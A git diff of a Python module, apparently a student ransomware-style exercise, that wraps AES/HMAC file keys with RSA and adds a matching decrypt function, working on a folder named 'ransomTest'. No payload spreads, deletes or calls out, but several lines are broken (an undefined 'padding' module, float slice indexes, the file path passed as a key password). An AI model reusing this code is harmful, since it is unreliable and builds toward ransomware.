@@ -6,7 +6,7 @@ from cryptography.hazmat.primitives import hashes, hmac, serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.asymmetric import padding as PADDING
-from fileEncryption import MyFileEncryptMAC
+import fileEncryption as fE 
 
 import json
 
@@ -21,17 +21,23 @@ HMAC_KEY = 16
 HMAC_KEY_LEN = len(str(HMAC_KEY))
 KEY_SIZE = 32
 ENC_KEY_SIZE = 32
+
+
 FILE_PATH = "C:/Users/corni/Desktop/ransomTest"
+# CWD = getcwd()
+# FILE_PATH = f'{CWD}/ransomTest'
+
+
+
 BACKEND = default_backend()
+pubKey = "/publicTest5.pem"
+privKey = "/privateTest5.pem"
+pubFilePath = FILE_PATH + pubKey
+privFilePath = FILE_PATH + privKey
 
 
 def keyCheck():
     
-    pubKey = "/publicTest.pem"
-    privKey = "/privateTest.pem"
-
-    pubFilePath = FILE_PATH + pubKey
-    privFilePath = FILE_PATH + privKey
 
     pubExists = os.path.isfile(pubFilePath)
     privExists = os.path.isfile(privFilePath)
@@ -96,11 +102,17 @@ def keyCheck():
 
 def MyRSAEncrypt(filepath, RSA_Publickey_filepath):
 
-    C, IV, tag, EncKey, HMACKey, ext = MyFileEncryptMAC(FILE_PATH)
+    C, IV, tag, EncKey, HMACKey, ext = fE.MyFileEncryptMAC(FILE_PATH)
 
-    with open(RSA_Publickey_filepath, 'rb') as pubKey:
-        publicPEM = serialization.load_pem_public_key(pubKey.read(), backend = BACKEND)
-        #print("Public key: " + str(publicPEM))
+    try:
+        with open(RSA_Publickey_filepath, 'rb') as pubKey:
+            publicPEM = serialization.load_pem_public_key(pubKey.read(), backend = BACKEND)
+            #print("Public key: " + str(publicPEM))
+    
+    except FileNotFoundError as e:
+        print('Cpuld not locate a public key')
+        exit(1)
+
 
     concatKey = EncKey + HMACKey
 
@@ -114,7 +126,31 @@ def MyRSAEncrypt(filepath, RSA_Publickey_filepath):
 
 
 
-# def MyRSADecrypt(RSACipher, C, IV, tag, ext, RSA_Privatekey_filepath):
+def MyRSADecrypt(RSACipher, C, IV, tag, ext, RSA_Privatekey_filepath):
+
+    # Open private key file to instantiate a private key decryption object
+
+    try:
+        with open(RSA_Privatekey_filepath, 'rb') as key_file:
+            private_key = serialization.load_pem_private_key(key_file.read(), password = RSA_Privatekey_filepath, backend = BACKEND)
+    except TypeError as e:
+        with open(RSA_Privatekey_filepath, 'rb') as key_file:
+            private_key = serialization.load_pem_private_key(key_file.read(), backend = BACKEND)
+    except FileNotFoundError as e:
+        print('No private key found')
+        exit(1)
+
+    # Use the private key object to decrypt
+
+    result = private_key.decrypt(RSACipher, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
+
+    # Encryptionn key and HMA C keys are the same size, split the data in half to retrieve both keys
+
+    encKey, HMACkey = result[:len(result) / 2], result[len(result) / 2:]
+
+    M = fE.MydecryptMAC(C, IV, tag, encKey, HMACkey, ext)
+
+    # return(encKey, HMACkey) 
 
 
     
